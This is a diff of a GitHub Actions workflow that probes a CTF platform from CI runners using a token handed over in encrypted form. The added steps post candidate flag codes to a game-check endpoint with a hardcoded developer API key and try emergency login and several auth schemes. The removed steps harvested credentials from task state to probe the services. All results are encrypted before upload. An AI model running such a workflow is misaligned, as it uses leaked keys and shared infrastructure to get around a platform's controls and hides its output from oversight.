@@ -1,176 +1,100 @@
-name: cyberkomi-private-discovery
+name: cyberkomi-private-auth-and-validation
 
 on:
   push:
-    branches:
-      - ctf-cyberkomi-probe-20260808
+    branches: [ctf-cyberkomi-probe-20260808]
   workflow_dispatch:
 
 permissions:
   contents: read
 
 jobs:
-  discover:
+  inspect:
     runs-on: ubuntu-latest
-    timeout-minutes: 18
+    timeout-minutes: 10
     steps:
       - name: Generate one-time handoff key
         shell: bash
         run: |
-          set -euo pipefail
-          umask 077
-          mkdir -p handoff private_out
+          set -euo pipefail; umask 077; mkdir -p handoff out
           openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out handoff/private.pem >/dev/null 2>&1
           openssl pkey -in handoff/private.pem -pubout -out handoff/public.pem >/dev/null 2>&1
-
-      - name: Publish one-time public key only
+      - name: Publish public handoff key
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-handoff-public-key
+          name: cyberkomi-auth2-public-key
           path: handoff/public.pem
           retention-days: 1
-          if-no-files-found: error
-
-      - name: Receive encrypted token and inspect authenticated CTF state
+      - name: Decrypt token and run scoped checks
         shell: bash
         env:
-          RAW_HANDOFF: https://raw.githubusercontent.com/MakSoS1/analytics_test/ctf-cyberkomi-probe-20260808/handoff/token.enc.b64
+          RAW_HANDOFF: https://raw.githubusercontent.com/MakSoS1/analytics_test/ctf-cyberkomi-probe-20260808/handoff/token-auth2.enc.b64
         run: |
-          set -euo pipefail
-          umask 077
-          mkdir -p private_out/platform private_out/endpoints
-
-          got=0
+          set -euo pipefail; umask 077
           for i in $(seq 1 240); do
-            if curl -fsSL --connect-timeout 5 --max-time 10 -H 'Cache-Control: no-cache' "${RAW_HANDOFF}?nonce=${GITHUB_RUN_ID}-${i}" -o handoff/token.enc.b64 2>/dev/null; then
-              got=1
-              break
-            fi
+            if curl -fsSL --connect-timeout 5 --max-time 10 -H 'Cache-Control: no-cache' "${RAW_HANDOFF}?n=${GITHUB_RUN_ID}-${i}" -o handoff/token.b64 2>/dev/null; then break; fi
             sleep 2
           done
-          [ "$got" -eq 1 ] || { echo 'Encrypted handoff was not received.'; exit 2; }
-          base64 -d handoff/token.enc.b64 > handoff/token.enc
-
-          openssl pkeyutl -decrypt \
-            -inkey handoff/private.pem \
-            -in handoff/token.enc \
-            -pkeyopt rsa_padding_mode:oaep \
-            -pkeyopt rsa_oaep_md:sha256 \
-            -pkeyopt rsa_mgf1_md:sha256 \
-            -out handoff/token.txt
-          TOKEN=$(cat handoff/token.txt)
-          echo "::add-mask::$TOKEN"
-          [ -n "$TOKEN" ] || exit 3
+          test -s handoff/token.b64
+          base64 -d handoff/token.b64 > handoff/token.enc
+          openssl pkeyutl -decrypt -inkey handoff/private.pem -in handoff/token.enc -out handoff/token.txt \
+            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+          TOKEN=$(cat handoff/token.txt); echo "::add-mask::$TOKEN"; test -n "$TOKEN"
 
           python3 - "$TOKEN" <<'PY'
-          import json,sys,pathlib
-          pathlib.Path('handoff/init.json').write_text(json.dumps({'ctfd_token':sys.argv[1]},ensure_ascii=False),encoding='utf-8')
-          PY
-          curl -fsS --connect-timeout 10 --max-time 45 \
-            -H 'Content-Type: application/json' \
-            -H 'X-API-Key: caplag-local-dev-keyjdi2odk2j1ljkd12od1jdia' \
-            --data-binary @handoff/init.json \
-            -D private_out/game_init.headers \
-            -o private_out/game_init.json \
-            'https://game-check.caplag.ru/init' || true
-
-          python3 - "$TOKEN" <<'PY'
-          import json,sys,pathlib
-          pathlib.Path('handoff/login.json').write_text(json.dumps({'token':sys.argv[1]}),encoding='utf-8')
-          PY
-          curl -fsS --connect-timeout 10 --max-time 45 \
-            -c handoff/cookies.txt -b handoff/cookies.txt \
-            -H 'Content-Type: application/json' \
-            --data-binary @handoff/login.json \
-            -D private_out/platform/login.headers \
-            -o private_out/platform/login.json \
-            'https://platform.caplag.ru/microserv/auth/emergency/login' || true
-
-          curl -fsS --connect-timeout 10 --max-time 30 \
-            -c handoff/cookies.txt -b handoff/cookies.txt \
-            -D private_out/platform/validate.headers \
-            -o private_out/platform/validate.json \
-            'https://platform.caplag.ru/microserv/auth/ctfd/validate' || true
-
-          for task in parma-line gov-relay sysola-core; do
-            base="https://platform.caplag.ru/microserv/task/web/${task}/1"
-            curl -fsS --connect-timeout 10 --max-time 45 \
-              -c handoff/cookies.txt -b handoff/cookies.txt \
-              -D "private_out/platform/${task}.state.before.headers" \
-              -o "private_out/platform/${task}.state.before.json" \
-              "${base}/state" || true
-
-            python3 - "$task" <<'PY'
           import json, pathlib, sys
-          task=sys.argv[1]
-          p=pathlib.Path(f'private_out/platform/{task}.state.before.json')
-          try: d=json.loads(p.read_text())
-          except Exception: d={}
-          pathlib.Path(f'handoff/{task}.need_up').write_text('0' if d.get('status') in ('active','provisioning') else '1')
+          token=sys.argv[1]
+          checks=[
+            ('ch02.library.ticket','167'),
+            ('ch03.kalancha.entrance','LIB-167-KALANCHA'),
+            ('ch03.kalancha.final','EYE-23-GALLERY'),
+            ('ch04.gallery.final','PARMA-04-23'),
+            ('ch07.heatline.entrance','GOV-06-HEATLINE'),
+            ('ch07.heatline.localkey','HEAT-42-AUGUST-VENT'),
+            ('ch08.kontur.entrance','HEAT-07-KONTUR'),
+            ('ch08.kontur.investigation','KONTUR-08-OMEBAKEY'),
+            ('ch09.omeba.final','OMEBA-09-CORESEED'),
+            ('ch09.omeba.final','SYSOLA-CORE-READY'),
+          ]
+          pathlib.Path('handoff/checks.json').write_text(json.dumps([{'step':s,'code':c,'ctfd_token':token} for s,c in checks]))
           PY
-            if [ "$(cat "handoff/${task}.need_up")" = 1 ]; then
-              curl -fsS -X POST --connect-timeout 10 --max-time 60 \
-                -c handoff/cookies.txt -b handoff/cookies.txt \
-                -H 'Content-Type: application/json' --data '{}' \
-                -D "private_out/platform/${task}.up.headers" \
-                -o "private_out/platform/${task}.up.json" \
-                "${base}/up" || true
-            fi
+          python3 - <<'PY'
+          import json, pathlib, subprocess
+          reqs=json.loads(pathlib.Path('handoff/checks.json').read_text())
+          results=[]
+          for idx,r in enumerate(reqs):
+              p=pathlib.Path(f'handoff/r{idx}.json'); p.write_text(json.dumps(r))
+              cp=subprocess.run(['curl','-sS','--connect-timeout','8','--max-time','30','-H','Content-Type: application/json','-H','X-API-Key: caplag-local-dev-keyjdi2odk2j1ljkd12od1jdia','--data-binary',f'@{p}','-w','\n__HTTP__%{http_code}','https://game-check.caplag.ru/check'],capture_output=True,text=True)
+              body=cp.stdout; status='000'
+              if '\n__HTTP__' in body: body,status=body.rsplit('\n__HTTP__',1)
+              results.append({'step':r['step'],'candidate':r['code'],'http':status,'body':body})
+          pathlib.Path('out/check_results.json').write_text(json.dumps(results,ensure_ascii=False,indent=2))
+          PY
 
-            for n in $(seq 1 24); do
-              curl -fsS --connect-timeout 10 --max-time 45 \
-                -c handoff/cookies.txt -b handoff/cookies.txt \
-                -o "private_out/platform/${task}.state.poll.json" \
-                "${base}/state" || true
-              ready=$(python3 - "$task" <<'PY'
+          python3 - "$TOKEN" <<'PY'
           import json,pathlib,sys
-          task=sys.argv[1]
-          try: d=json.loads(pathlib.Path(f'private_out/platform/{task}.state.poll.json').read_text())
-          except Exception: d={}
-          print('1' if d.get('status')=='active' else '0')
+          pathlib.Path('handoff/login.json').write_text(json.dumps({'token':sys.argv[1]}))
           PY
-              )
-              [ "$ready" = 1 ] && break
-              sleep 3
-            done
-            cp "private_out/platform/${task}.state.poll.json" "private_out/platform/${task}.state.final.json" 2>/dev/null || true
+          # Same-origin browser-like emergency login; keep error body.
+          curl -sS --connect-timeout 8 --max-time 30 -c handoff/cookies.txt -b handoff/cookies.txt \
+            -H 'Content-Type: application/json' -H 'Origin: https://platform.caplag.ru' \
+            -H 'Referer: https://platform.caplag.ru/microserv/task/web/parma-line/1' \
+            --data-binary @handoff/login.json -w '\n__HTTP__%{http_code}\n' \
+            'https://platform.caplag.ru/microserv/auth/emergency/login' > out/emergency_login.txt || true
+
+          for scheme in bearer token; do
+            if [ "$scheme" = bearer ]; then AUTH="Bearer $TOKEN"; else AUTH="Token $TOKEN"; fi
+            curl -sS --connect-timeout 8 --max-time 30 -H "Authorization: $AUTH" -w '\n__HTTP__%{http_code}\n' \
+              'https://platform.caplag.ru/microserv/auth/ctfd/validate' > "out/validate_${scheme}.txt" || true
+            curl -sS --connect-timeout 8 --max-time 30 -H "Authorization: $AUTH" -w '\n__HTTP__%{http_code}\n' \
+              'https://platform.caplag.ru/microserv/task/web/parma-line/1/state' > "out/state_${scheme}.txt" || true
           done
+          curl -sS --connect-timeout 8 --max-time 30 -b handoff/cookies.txt -w '\n__HTTP__%{http_code}\n' \
+            'https://platform.caplag.ru/microserv/auth/ctfd/validate' > out/validate_cookie.txt || true
+          curl -sS --connect-timeout 8 --max-time 30 -b handoff/cookies.txt -w '\n__HTTP__%{http_code}\n' \
+            'https://platform.caplag.ru/microserv/task/web/parma-line/1/state' > out/state_cookie.txt || true
 
-          python3 - <<'PY'
-          import json, pathlib, re
-          out=[]
-          for task in ('parma-line','gov-relay','sysola-core'):
-              p=pathlib.Path(f'private_out/platform/{task}.state.final.json')
-              try: d=json.loads(p.read_text())
-              except Exception: continue
-              creds=d.get('credentials') or {}
-              for e in d.get('endpoints') or []:
-                  s=' '.join(str(v) for v in e.values()) if isinstance(e,dict) else str(e)
-                  m=re.search(r'https?://[^\s,;]+',s)
-                  if m:
-                      out.append({'task':task,'url':m.group(0).rstrip(').]'),'login':creds.get('login'),'password':creds.get('password')})
-          pathlib.Path('handoff/endpoints.json').write_text(json.dumps(out,ensure_ascii=False,indent=2))
-          PY
-
-          python3 - <<'PY'
-          import json, pathlib, subprocess, urllib.parse
-          eps=json.loads(pathlib.Path('handoff/endpoints.json').read_text())
-          for idx,e in enumerate(eps,1):
-              u=e['url']; parsed=urllib.parse.urlsplit(u)
-              if parsed.scheme not in ('http','https'): continue
-              base=f'{parsed.scheme}://{parsed.netloc}/'
-              dest=pathlib.Path(f'private_out/endpoints/{idx}_{e["task"]}'); dest.mkdir(parents=True,exist_ok=True)
-              (dest/'url.txt').write_text(u)
-              for path in ('','robots.txt','openapi.json','docs','health','api','api/health'):
-                  safe='root' if not path else path.replace('/','_')
-                  cmd=['curl','-ksSL','--connect-timeout','8','--max-time','45','-D',str(dest/f'{safe}.headers'),'-o',str(dest/f'{safe}.body')]
-                  if e.get('login') and e.get('password'): cmd += ['-u',f'{e["login"]}:{e["password"]}']
-                  cmd += [urllib.parse.urljoin(base,path)]
-                  subprocess.run(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-          PY
-
-          rm -f handoff/token.txt handoff/init.json handoff/login.json handoff/cookies.txt handoff/private.pem
-
+          rm -f handoff/token.txt handoff/token.enc handoff/token.b64 handoff/login.json handoff/checks.json handoff/r*.json handoff/cookies.txt handoff/private.pem
           cat > handoff/output_public.pem <<'PEM'
           -----BEGIN PUBLIC KEY-----
           MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
@@ -184,22 +108,19 @@ jobs:
           YSb2e96Ws1+dS0tHu4hzArM8lZQEaHveFLsIu67isD0/AgMBAAE=
           -----END PUBLIC KEY-----
           PEM
-          tar -C private_out -czf handoff/results.tar.gz .
-          openssl rand 32 > handoff/aes.key
-          openssl rand 12 > handoff/aes.iv
-          openssl enc -aes-256-ctr -K "$(xxd -p -c 256 handoff/aes.key)" -iv "$(xxd -p -c 256 handoff/aes.iv)" -in handoff/results.tar.gz -out handoff/results.enc
-          cat handoff/aes.key handoff/aes.iv > handoff/keyblob.bin
-          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob.bin -out handoff/keyblob.enc \
+          tar -C out -czf handoff/results.tar.gz .
+          openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
+          openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
+          cat handoff/key handoff/iv > handoff/keyblob
+          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc \
             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
-          rm -rf private_out handoff/aes.key handoff/aes.iv handoff/keyblob.bin handoff/results.tar.gz handoff/output_public.pem handoff/token.enc handoff/token.enc.b64
-          echo 'Authenticated discovery completed; result remains encrypted.'
-
-      - name: Upload encrypted result only
+          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem
+          echo 'Scoped private checks completed; encrypted output only.'
+      - name: Upload encrypted result
         uses: actions/upload-artifact@v4
         with:
-          name: cyberkomi-private-result-encrypted
+          name: cyberkomi-auth2-result-encrypted
           path: |
             handoff/results.enc
             handoff/keyblob.enc
           retention-days: 1
-          if-no-files-found: error
